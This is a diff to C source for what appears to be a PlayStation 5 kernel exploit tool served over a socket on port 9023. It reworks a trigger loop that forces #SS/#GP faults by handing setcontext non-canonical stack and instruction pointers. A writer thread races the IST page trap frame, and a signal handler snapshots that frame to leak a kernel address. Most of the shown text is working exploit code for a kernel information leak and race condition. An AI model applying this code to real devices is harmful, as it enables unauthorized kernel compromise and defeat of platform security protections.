@@ -90,6 +90,11 @@ static volatile int          gp_trap_sig_received;
  * find the real offsets. */
 static int gp_trap_uc_rip_off = -1;
 static int gp_trap_uc_rsp_off = -1;
+/* IST page pointer + cached trap frame values read in signal handler */
+static volatile uint8_t *gp_trap_ist_page_ptr;
+static volatile uint64_t gp_trap_ist_rip;
+static volatile uint64_t gp_trap_ist_cs;
+static volatile uint64_t gp_trap_ist_err;
 
 /* Server configuration */
 #define SERVER_PORT 9023
@@ -2867,6 +2872,14 @@ static void
 gp_trap_fault_handler(int sig, siginfo_t *info, void *ctx)
 {
     (void)info;
+
+    /* Snapshot IST page trap frame before kernel can clear it */
+    if (gp_trap_ist_page_ptr) {
+        gp_trap_ist_rip = *(volatile uint64_t *)(gp_trap_ist_page_ptr + 0xFD8);
+        gp_trap_ist_cs  = *(volatile uint64_t *)(gp_trap_ist_page_ptr + 0xFE0);
+        gp_trap_ist_err = *(volatile uint64_t *)(gp_trap_ist_page_ptr + 0xFD0);
+    }
+
     if (gp_trap_uc_rip_off >= 0) {
         /* Use runtime-discovered offsets (PS5 layout differs from SDK) */
         uint8_t *p = (uint8_t *)ctx;
@@ -4605,6 +4618,9 @@ broad_done:
         gp_trap_got_result = 0;
         gp_trap_doreti_addr = 0;
 
+        /* Set global IST pointer for signal handler to read trap frame */
+        gp_trap_ist_page_ptr = (volatile uint8_t *)ist_page;
+
         if (thrd_create(&writer_thread, gp_trap_writer_fn, ist_page) == thrd_success) {
             writer_started = 1;
             send_response(sock, "  Writer thread started (target: ist_page+0xFE0)\n");
@@ -4755,36 +4771,87 @@ broad_done:
             }
         }
 
-        /* Phase 3: Trigger loop */
+        /* Phase 3: Trigger loop
+         *
+         * sigsetjmp is inside the while loop so we can retry after
+         * each signal.  We check both the signal handler's mc_rip
+         * (which sleirsgoevy's technique needs the CS race for) and
+         * the IST page RIP field (direct read, race-independent).
+         *
+         * Strategies:
+         *   attempts  1-25: non-canonical RSP (triggers #SS on AMD)
+         *   attempts 26-50: non-canonical RIP (triggers #GP)
+         */
         send_response(sock, "\n  Starting trigger loop (50 attempts)...\n");
         {
             int max_attempts = 50;
             gp_trap_attempt_count = 0;
-            gp_trap_sig_received = 0;
             gp_trap_got_result = 0;
             gp_trap_doreti_addr = 0;
             volatile uint8_t *istp = (volatile uint8_t *)ist_page;
 
-            /* Clear IST trap frame area */
-            for (int i = 0xFD0; i < 0x1000; i++)
-                istp[i] = 0;
+            while (!gp_trap_got_result &&
+                   gp_trap_attempt_count < max_attempts) {
 
-            if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
-                /* Signal handler caught something */
-                send_response(sock,
-                    "  signal %d caught! doreti=0x%lx cs=0x%lx "
-                    "err=0x%lx\n",
-                    (int)gp_trap_sig_received,
-                    (uint64_t)gp_trap_doreti_addr,
-                    (uint64_t)gp_trap_mc_cs,
-                    (uint64_t)gp_trap_mc_err);
-            } else {
-                while (!gp_trap_got_result &&
-                       gp_trap_attempt_count < max_attempts) {
-                    /*
-                     * Oversized buffer for getcontext/setcontext so
-                     * the real PS5-sized ucontext fits.
-                     */
+                /* Clear IST trap frame area each attempt */
+                for (int i = 0xFD0; i < 0x1000; i += 8)
+                    *(volatile uint64_t *)(istp + i) = 0;
+
+                /* Reset per-attempt state */
+                gp_trap_sig_received = 0;
+                gp_trap_ist_rip = 0;
+                gp_trap_ist_cs = 0;
+                gp_trap_ist_err = 0;
+
+                int jmp_rc = sigsetjmp(gp_trap_jmp_env, 1);
+                if (jmp_rc != 0) {
+                    /* Returned from signal handler */
+                    gp_trap_attempt_count++;
+
+                    send_response(sock,
+                        "  [sig] attempt %d: sig=%d "
+                        "mc_rip=0x%lx mc_cs=0x%lx mc_err=0x%lx\n",
+                        (int)gp_trap_attempt_count,
+                        (int)gp_trap_sig_received,
+                        (uint64_t)gp_trap_doreti_addr,
+                        (uint64_t)gp_trap_mc_cs,
+                        (uint64_t)gp_trap_mc_err);
+                    send_response(sock,
+                        "        IST: RIP=0x%lx CS=0x%lx err=0x%lx\n",
+                        (uint64_t)gp_trap_ist_rip,
+                        (uint64_t)gp_trap_ist_cs,
+                        (uint64_t)gp_trap_ist_err);
+
+                    /* Check signal handler mc_rip for kernel address
+                     * (the CS race succeeded if mc_rip is kernel) */
+                    if (gp_trap_doreti_addr >= 0xFFFF800000000000ULL &&
+                        gp_trap_doreti_addr != 0xFFFFFFFFFFFFFFFFULL) {
+                        send_response(sock,
+                            "  *** signal mc_rip is kernel: 0x%lx ***\n",
+                            (uint64_t)gp_trap_doreti_addr);
+                        gp_trap_got_result = 1;
+                        break;
+                    }
+
+                    /* Check IST page RIP for kernel address */
+                    if (gp_trap_ist_rip >= 0xFFFF800000000000ULL &&
+                        gp_trap_ist_rip != 0xFFFFFFFFFFFFFFFFULL) {
+                        send_response(sock,
+                            "  *** IST RIP is kernel: 0x%lx ***\n",
+                            (uint64_t)gp_trap_ist_rip);
+                        gp_trap_doreti_addr = gp_trap_ist_rip;
+                        gp_trap_mc_cs = gp_trap_ist_cs;
+                        gp_trap_mc_err = gp_trap_ist_err;
+                        gp_trap_got_result = 1;
+                        break;
+                    }
+
+                    /* Neither source had kernel address; retry */
+                    continue;
+                }
+
+                /* Normal path: getcontext + setcontext */
+                {
                     uint8_t uc_buf[2048] __attribute__((aligned(16)));
                     memset(uc_buf, 0, sizeof(uc_buf));
 
@@ -4796,48 +4863,37 @@ broad_done:
                     if (gp_trap_attempt_count > max_attempts)
                         break;
 
-                    /* Check IST page for CPU trap frame */
-                    {
-                        uint64_t rip_val = *(volatile uint64_t *)(istp + 0xFD8);
-                        uint64_t cs_val  = *(volatile uint64_t *)(istp + 0xFE0);
-                        uint64_t err_val = *(volatile uint64_t *)(istp + 0xFD0);
-
-                        if (gp_trap_attempt_count <= 3) {
-                            send_response(sock,
-                                "  IST@%d: err=0x%lx RIP=0x%lx "
-                                "CS=0x%lx\n",
-                                (int)gp_trap_attempt_count,
-                                err_val, rip_val, cs_val);
+                    /* Choose strategy based on attempt number */
+                    const char *strategy;
+                    if (gp_trap_attempt_count <= 25) {
+                        /* Non-canonical RSP → #SS on AMD, #GP on Intel */
+                        if (gp_trap_uc_rsp_off >= 0) {
+                            *(uint64_t *)(uc_buf + gp_trap_uc_rsp_off) =
+                                0x8000000000000000ULL;
+                        } else {
+                            ucontext_t *uc = (ucontext_t *)uc_buf;
+                            uc->uc_mcontext.mc_rsp =
+                                0x8000000000000000ULL;
                         }
-
-                        if (rip_val >= 0xFFFF800000000000ULL &&
-                            rip_val != 0xFFFFFFFFFFFFFFFFULL) {
-                            gp_trap_doreti_addr = rip_val;
-                            gp_trap_mc_cs = cs_val;
-                            gp_trap_mc_err = err_val;
-                            gp_trap_got_result = 1;
-                            gp_trap_sig_received = -1;
-                            send_response(sock,
-                                "  IST hit! RIP=0x%lx CS=0x%lx "
-                                "err=0x%lx\n",
-                                rip_val, cs_val, err_val);
-                            break;
-                        }
-                    }
-
-                    /* Set non-canonical RSP to fault on iretq */
-                    if (gp_trap_uc_rsp_off >= 0) {
-                        *(uint64_t *)(uc_buf + gp_trap_uc_rsp_off) =
-                            0x8000000000000000ULL;
+                        strategy = "non-canonical RSP";
                     } else {
-                        ucontext_t *uc = (ucontext_t *)uc_buf;
-                        uc->uc_mcontext.mc_rsp = 0x8000000000000000ULL;
+                        /* Non-canonical RIP → #GP */
+                        if (gp_trap_uc_rip_off >= 0) {
+                            *(uint64_t *)(uc_buf + gp_trap_uc_rip_off) =
+                                0x8000000000000000ULL;
+                        } else {
+                            ucontext_t *uc = (ucontext_t *)uc_buf;
+                            uc->uc_mcontext.mc_rip =
+                                0x8000000000000000ULL;
+                        }
+                        strategy = "non-canonical RIP";
                     }
 
                     if (gp_trap_attempt_count <= 5 ||
                         gp_trap_attempt_count % 10 == 0) {
-                        send_response(sock, "  attempt %d, setcontext...\n",
-                                      (int)gp_trap_attempt_count);
+                        send_response(sock,
+                            "  attempt %d (%s)...\n",
+                            (int)gp_trap_attempt_count, strategy);
                     }
 
                     setcontext((ucontext_t *)uc_buf);
@@ -4847,11 +4903,11 @@ broad_done:
                         "  setcontext returned! errno=%d\n", errno);
                     usleep(1000);
                 }
-
-                send_response(sock, "  loop done: count=%d got=%d\n",
-                              (int)gp_trap_attempt_count,
-                              (int)gp_trap_got_result);
             }
+
+            send_response(sock, "  loop done: count=%d got=%d\n",
+                          (int)gp_trap_attempt_count,
+                          (int)gp_trap_got_result);
 
             /* Final IST dump if no result */
             if (!gp_trap_got_result) {
@@ -4995,6 +5051,9 @@ broad_done:
 
     step7_cleanup:
         send_response(sock, "\nStep 7 cleanup...\n");
+
+        /* Clear IST page pointer so signal handler won't read stale data */
+        gp_trap_ist_page_ptr = NULL;
 
         /* Stop writer thread */
         gp_trap_stop_writer = 1;
